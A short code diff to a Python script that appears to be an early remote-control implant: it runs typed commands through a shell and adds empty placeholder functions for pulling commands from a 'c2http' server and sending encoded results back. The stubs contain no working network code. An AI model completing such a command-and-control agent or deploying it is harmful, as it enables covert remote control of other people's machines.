@@ -6,10 +6,18 @@ def tmp_get_cmd():
     return input("Type CMD > ")
 
 
+def get_cmd_from_c2http():
+    # Connect to c2http server and pull/rcv commands
+    pass
+
+
 def execute_cmd(cmd):
     # todo: put in simple exception handling
     return cmd_ouput(cmd, shell=True)
 
+def send_result_to_c2http():
+    # Send encoded results back to server
+    pass
 
 def main():
     cmd = tmp_get_cmd()
